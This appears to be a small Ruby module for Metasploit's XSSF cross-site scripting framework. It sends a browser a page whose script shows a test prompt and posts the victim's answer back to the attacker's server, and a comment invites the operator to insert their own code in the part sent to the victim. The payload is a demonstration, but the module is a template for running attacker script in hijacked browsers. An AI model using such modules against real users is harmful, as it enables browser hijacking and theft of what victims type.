require 'msf/core'
require 'msf/base/xssf'

#
# READ README FILE FOR MORE INFORMATION ABOUT MODULES
# Simple test module. Displays a javascript alert to the choosen victim's browser.
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'PROMPT XSSF',
			'Description' => 'Simple XSSF prompt'
		))
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{ 	<html><body><script>XSSF_POST(prompt("Simple XSSF prompt test : ","TEST"), '#{self.name}');</script></body></html>	}
		
		send_response(cli, code, {'Content-Type' => 'text/html'} )
	end
end